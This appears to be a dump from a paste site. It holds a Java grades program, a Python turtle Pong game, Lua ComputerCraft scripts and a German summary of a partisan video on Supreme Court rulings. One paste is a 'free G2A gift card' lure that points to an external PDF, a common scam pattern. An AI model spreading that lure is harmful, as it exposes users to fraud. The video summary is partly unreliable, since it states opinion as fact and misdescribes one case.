print(""Streaming and playing audio from"",dfpwmFileName,""through wired modems..."")
streamAndPlayAudio()

-- Fechar o ficheiro
dfpwmFile.close()
print(""Audio playback completed"")
"
SsEjehpx,Aluno.java,RogerioSouza,Java,Thursday 27th of June 2024 06:54:12 PM CDT,"package br.senac.df.curso.desafio.modelo;

import java.util.ArrayList;

public class Aluno {
    private String nome;
    private ArrayList<Double> notas = new ArrayList<>();

    public Aluno(String nome){
        this.nome = nome;
    }

    public void adicionarNota(double nota){
        notas.add(nota);
    }


    public double getMedia(){
        double somaTotal = 0;
        for (int contador = 0; contador < notas.size(); contador++) {
            somaTotal += notas.get(contador);
        }
        return somaTotal/notas.size();
    }



    public String getNome() {
        return nome;
    }

    public void setNome(String nome) {
        this.nome = nome;
    }

    public ArrayList<Double> getNotas() {
        return notas;
    }


    @Override
    public  String toString(){
        return  this.nome;
    }

}
"
28LYYp4c,ControleDeAlunosMain.java,RogerioSouza,Java,Thursday 27th of June 2024 06:53:30 PM CDT,"import br.senac.df.curso.desafio.modelo.Aluno;

import java.util.ArrayList;
import java.util.Scanner;

public class ControleDeAlunosMain {
    public static void main(String[] args) {

        ArrayList<Aluno> alunos = new ArrayList<>();



        String menu = """"""
                     Digite a opção desejada:
                     1 - Adicionar Aluno
                     2 - Calcular a Média
                     3 - Remover Aluno
                     4 - Listar Alunos
                     5 - Exibir Aluno com Maior Media
                     6 - Sair
                """""";

        while(true){
            int opcao = (int) capturaNumeroDoTeclado(menu);

            switch (opcao)
            {
                case 1: //Adicionar Aluno
                    String nomeDoNovoAluno = capturaStringDoTeclado(""Digite o nome do Aluno: "");
                    Aluno  novoAluno = new Aluno(nomeDoNovoAluno);

                    atribuirNovaNota(novoAluno);
                    atribuirNovaNota(novoAluno);
                    atribuirNovaNota(novoAluno);

                    alunos.add(novoAluno);

                break;
                case 2: //Calcular a Média
                    System.out.println(""Listando Alunos e suas médias"");
                    for(int indice =0; indice<alunos.size(); indice++){
                        Aluno alunoDaLista = alunos.get(indice);
                        System.out.println(alunoDaLista.getNome()+"" ""+alunoDaLista.getMedia());
                    }
                    break;
                case 3: //Remover Aluno
                    String nomeDoAlunoParaRemover = capturaStringDoTeclado(""Informe o nome do Aluno para removê-lo: "");
                    int posicaoDoAlunoNalista = -1;

                    for(int indice =0; indice < alunos.size(); indice++){
                        Aluno alunoDaLista = alunos.get(indice);
                        if(nomeDoAlunoParaRemover.equals(alunoDaLista.getNome())){
                            posicaoDoAlunoNalista = indice;
                            break;
                        }
                    }
                    alunos.remove(posicaoDoAlunoNalista);
                    System.out.println(""Aluno Removido"");
                    break;
                case 4: //Listar Alunos
                    System.out.println(alunos);
                break;
                case 5: //Exibir Aluno com Maior Media
                    double maiorMedia = 0;
                    Aluno alunoComMaiorMedia = null;
                    for(int indice =0; indice<alunos.size(); indice++){
                        Aluno alunoDaLista = alunos.get(indice);
                        if(alunoDaLista.getMedia() > maiorMedia){
                            maiorMedia = alunoDaLista.getMedia();
                            alunoComMaiorMedia = alunoDaLista;
                        }
                    }
                    System.out.println(""Aluno com maior média: ""+alunoComMaiorMedia.getNome());
                break;

                case 6: //Sair
                    System.out.println(""Sistema Encerrado"");
                    System.exit(0);
                default:
                    System.out.println(""Opção Inválida"");
                    break;
            }

        }
    }

    public  static void atribuirNovaNota(Aluno aluno){
        double nota = capturaNumeroDoTeclado(""Informe a nota do aluno: "");
        aluno.adicionarNota(nota);
    }



    public static double capturaNumeroDoTeclado(String prompt){
        System.out.print(prompt);
        Scanner entrada = new Scanner(System.in);
        if(entrada.hasNextLine()){
            entrada.hasNextLine();
        }
        return  entrada.nextDouble();
    }

    public static String capturaStringDoTeclado(String prompt){
        System.out.print(prompt);
        Scanner entrada = new Scanner(System.in);
        if(entrada.hasNextLine()){
            entrada.hasNextLine();
        }
        return  entrada.nextLine();
    }

}
"
m5BghQ0Q,Python - Turtle - Pong - (Stackoverflow),furas,Python,Thursday 27th of June 2024 06:51:47 PM CDT,"#!/usr/bin/env python3

""""""
# date: 2024.06.28
# [Second instance of a class suppresses/deletes the first one in my Python program - Stack Overflow](https://stackoverflow.com/questions/78677249/second-instance-of-a-class-suppresses-deletes-the-first-one-in-my-python-program?noredirect=1#comment138718516_78677249)
""""""

from turtle import Turtle
from turtle import Screen

# --- constants ---  # PEP8: `UPPER_CASE_NAMES`

# BOX = 30

# --- classes ---  

class Paddle:

    def __init__(self, side, key_left, key_right, x, color):
    
        self.key_left = key_left
        self.key_right = key_right

        self.paddle = Turtle(shape=""square"")
        self.paddle.color(color)
        self.paddle.penup()
        self.paddle.setx(x)
        self.paddle.sety(0)

        self.pressed_up = False
        self.pressed_down = False
        
        self.paddle.screen.onkeypress(key=self.key_left,  fun=self.move_up)
        self.paddle.screen.onkeypress(key=self.key_right, fun=self.move_down)

        self.paddle.screen.onkeyrelease(key=self.key_left,  fun=self.move_up_stop)
        self.paddle.screen.onkeyrelease(key=self.key_right, fun=self.move_down_stop)

        half_height = screen.canvheight // 2
        
        self.range_top    =  half_height - 10
        self.range_bottom = -half_height + 10
        #print('[DEBUG]', self.range_top, self.range_bottom)

        self.speed = 0
        
    def update(self):
        
        if self.pressed_up and self.pressed_down:  # both keys are presse then don't move
            self.speed = 0
        elif self.pressed_up:    # only one is pressed
            self.speed = 5  
        elif self.pressed_down:  # only one is pressed
            self.speed = -5
        else:  # both keys are unpressed
            self.speed = 0
    
        if self.speed != 0:
            current_y = self.paddle.ycor()
            new_y = current_y + self.speed
            
            if self.range_top > new_y > self.range_bottom:
                self.paddle.sety(new_y)

    # I don't do calculation here (and don't execute `update()` 
    # because key repeates presses slow and it slows all movement
    def move_up(self):
        self.pressed_up = True

    def move_down(self):
        self.pressed_down = True

    def move_up_stop(self):
        self.pressed_up = False

    def move_down_stop(self):
        self.pressed_down = False

class Ball:

    def __init__(self, x=0, y=0, color='black'):
        self.ball = Turtle(shape=""square"")
        self.ball.color(color)
        self.ball.penup()
        self.ball.setx(x)
        self.ball.sety(y)
        self.speed_x = 3
        self.speed_y = 3
        
        half_width = screen.canvwidth // 2
        half_height = screen.canvheight // 2
        
        self.range_top    =  half_height - 10
        self.range_bottom = -half_height + 10
        self.range_left   =  half_width - 10
        self.range_right  = -half_width + 10
        
    def update(self):
        current_x = self.ball.xcor()
        current_y = self.ball.ycor()
        new_x = current_x + self.speed_x
        new_y = current_y + self.speed_y
        
        if new_x < self.range_right or new_x > self.range_left:
            self.speed_x = -self.speed_x
        if new_y > self.range_top   or new_y < self.range_bottom:
            self.speed_y = -self.speed_y
        
        self.ball.setx(new_x)
        self.ball.sety(new_y)
        
# --- functions ----

def mainloop():
    left_pad.update()
    right_pad.update()
    ball.update()
    
    screen.update()

    # update after ? ms
    screen.ontimer(mainloop, 5)

# --- main ---

screen = Screen()
screen.bgcolor(""beige"")
screen.title(""Pong!"")
screen.setup(width=820, height=620)
screen.screensize(canvwidth=800, canvheight=600)
screen.tracer(0)
screen.listen()

half_width = screen.canvwidth // 2

x = -half_width + 20
left_pad  = Paddle(""left"", ""w"", ""s"", x, 'red')

x =  half_width - 20
right_pad = Paddle(""right"", ""Up"", ""Down"", x, 'green')

ball = Ball()

mainloop()

screen.exitonclick()
"
RvsxyeWY,Supreme Court Decision Summary,worstbull,HTML,Thursday 27th of June 2024 06:19:55 PM CDT,"<!DOCTYPE html>
<html lang=""de"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Supreme Court Decision Summary</title>
</head>
<body>
    <h1>Zusammenfassung des Videos ""Supreme Court DROPS BOMBSHELL Decision at KEY MOMENT""</h1>
    <p>Das Video ""Supreme Court DROPS BOMBSHELL Decision at KEY MOMENT"" von MeidasTouch behandelt drei wichtige Entscheidungen des US Supreme Court, die erhebliche Auswirkungen auf das Land und unser Leben haben. Im Folgenden eine detaillierte Zusammenfassung der Inhalte:</p>

    <h2>1. SEC vs. Jarkesy</h2>
    <ul>
        <li>Das Gericht entschied mit einer 6:3-Mehrheit, dass Angeklagte, gegen die die SEC zivilrechtliche Strafen verhängt, Anspruch auf ein Geschworenenverfahren vor einem Bundesgericht haben.</li>
        <li>Diese Entscheidung wird weitreichende Auswirkungen auf andere Behörden und deren Fähigkeit haben, zivilrechtliche Strafen zu verhängen.</li>
        <li>Diese Entscheidung ist Teil eines größeren Projekts, das die ""Deconstruction of the Administrative State"" zum Ziel hat, unterstützt von rechtsgerichteten Geldgebern. Ziel ist es, sicherzustellen, dass die Bundesregierung unter demokratischen Verwaltungen keine Industrien regulieren kann.</li>
    </ul>

    <h2>2. Ohio vs. EPA</h2>
    <ul>
        <li>Mit einer knappen 5:4-Mehrheit blockierte das Gericht die ""Good Neighbor Rule"" der EPA, die die Ozonemissionen von aufwindigen Staaten einschränkt.</li>
        <li>Interessanterweise stimmte Amy Coney Barrett mit den von Demokraten ernannten Richtern überein und zeigte Bedenken gegen den Einsatz des sogenannten ""Shadow Docket"" für Notfallentscheidungen ohne vollständige Überprüfung.</li>
    </ul>

    <h2>3. MO vs. US (Abtreibungsfall aus Idaho)</h2>
    <ul>
        <li>Das Gericht entschied, dass Krankenhäuser in Idaho, die Bundesmittel erhalten, verpflichtet sind, Notfallabtreibungen zur Gesundheitsstabilisierung durchzuführen, trotz des Abtreibungsverbots in Idaho.</li>
        <li>Diese Entscheidung stellt einen Konflikt zwischen Bundesgesetz und staatlichen Abtreibungsverboten dar. Die Richter Roberts, Barrett und Kavanaugh suchten nach Wegen, die Bundes- und Landesgesetze in Einklang zu bringen, um politische Kontroversen während der Wahlzeit zu vermeiden.</li>
    </ul>

    <h2>Detaillierte Analyse</h2>

    <h3>SEC vs. Jarkesy</h3>
    <ul>
        <li>Die Entscheidung basiert auf dem siebten Verfassungszusatz, der das Recht auf ein Geschworenenverfahren garantiert. Dies erschwert es der SEC und anderen Behörden, zivilrechtliche Strafen zu verhängen, da sie nun Juryprozesse durchführen müssen, was mehr Ressourcen erfordert.</li>
        <li>Langfristig könnte dies die Durchsetzungsfähigkeit vieler Regulierungsbehörden schwächen, da ihnen die Mittel fehlen, umfassende Gerichtsverfahren durchzuführen.</li>
    </ul>

    <h3>Ohio vs. EPA</h3>
    <ul>
        <li>Die Entscheidung wurde kritisiert, da sie es verschmutzenden Staaten ermöglicht, schädliche Emissionen in benachbarte Staaten zu übertragen, was die Umweltbelastung erhöht.</li>
        <li>Amy Coney Barretts Einwände gegen den Einsatz des Shadow Docket reflektieren ihre Bedenken bezüglich der Legitimität und Transparenz solcher Notfallentscheidungen.</li>
    </ul>

    <h3>MO vs. US</h3>
    <ul>
        <li>Der Fall dreht sich um den Konflikt zwischen Bundesanforderungen an die Notfallversorgung und strikten staatlichen Abtreibungsverboten.</li>
        <li>Die Entscheidung des Gerichts, den Fall nicht weiter zu behandeln, lässt die Bundesvorschriften zur Gesundheitsstabilisierung bestehen und untergräbt das staatliche Abtreibungsverbot in Idaho.</li>
    </ul>

    <p>Zusammengefasst zeigt das Video, wie der Supreme Court durch strategische Entscheidungen die Macht und Effektivität von Regulierungsbehörden untergräbt, Umweltvorschriften lockert und den Zugang zu Gesundheitsdienstleistungen beeinflusst. Die Diskussion betont die politischen und ideologischen Hintergründe dieser Entscheidungen und deren potenziell weitreichende Auswirkungen auf die US-amerikanische Gesellschaft.</p>
</body>
</html>
"
JC91DpyP,🤑 G2A.COM FREE GIFT CARD GUIDE JUN 2024 V5 🤑,x2w,GetText,Thursday 27th of June 2024 06:00:03 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view

Working as of:
28 June 2024

"
ZumP5y01,potato,Harlaquin,Lua,Thursday 27th of June 2024 05:31:23 PM CDT,"--  Potato Farm Code
--  

southwest = {187, 66, 267}
sourtheast = {195, 66, 267}
northwest = {187, 66, 259}
northeast = {195, 66, 259}

fuelChest = {194, 66, 268}
storageChest = {188, 66, 268}
slotCount = 16

--  Returns for 'itemName' slot in inventory
function getItemIndex(itemName)
    for slot = 1, 16, 1 do
        item = turtle.getItemDetail(slot)
        if(item ~= nil) then
            if(item[""name""] == itemName) then
                return slot
            end
        end
    end
end


function checkFuel()
    turtle.select(1)
 
    if(turtle.getFuelLevel() < 50) then
        print(""Attempting Refuel..."")
        for slot = 1, slotCount, 1 do
            turtle.select(slot)
            if(turtle.refuel(1)) then
                return true
            end
        end

        return false
    else
        return true
    end
end


function getFuel()
    
end


-- returns turtle distance compared to target location and counts fuel cost
function getDistance(currX, currY, currZ)
    cordX, cordY, cordZ = gps.locate()
    fuelCost = turtle.getFuelLevel()
    --effeicency variable -checks if travel is possible !!change later after troubleshooting
    efficiency = true

    compX = currX

    compared_set = {}

    return distance, efficency
end



--  actual command to move to a given destination
function moveTo(x, y, z)
    destination = {x, y, z}

    if destination~=gps.locate()
    then
        --  moveing to location based on 
    end
end


--  main fuction to have a never ending farm
--  !!northeast is a place holder for the last block in the calculated inputs
--  !! make sure code can move side to side in a 8x8 grid repeating the dig/plant action 
--  !! has to stay inside placed location
while(1) do


    
    -- checks turtle for fuel
    if checkFuel() then

        startCord = gps.locate()
        fuelstat = turtle.getFuelLevel()
        distan, efficiency_value = getDistance()

        --checks if given inputs are possible
        if(efficiency_value) then

            isBlock, data = turtle.inspectDown()
            if(isBlock) then
                if (data['state']['age'] <= 7)
                then
                    turtle.digDown()
                    potatoIndex = getItemIndex(""minecraft:potato"")
                    turtle.select(potatoIndex)
                    turtle.placeDown()
                else
                    potatoIndex = getItemIndex(""minecraft:potato"")
                    turtle.placeDown()
                end
            
            

            end   
        --  effeicency == false then returns to fuel chest or breaks    
        else
            print(""turtle has fuel, effeicency value = "" .. efficiency_value)
            startCord = gps.locate()
            moveTo(fuelChest)
            turtle.refuel()
            if turtle.checkFuel() then
                moveTo(startCord)
            else
                print(""Breaks Point: CheckFuel = "" .. checkFuel())
                os.exit()
            end
        end


    --  If turtle doesnt have fuel then it moves to chest, refuels, returns, then starts program from the top
    else 

        startCord = gps.locate()
        moveTo(fuelChest)
        turtle.refuel()
        if turtle.checkFuel() then
            moveTo(startCord)
        end
    end
end"
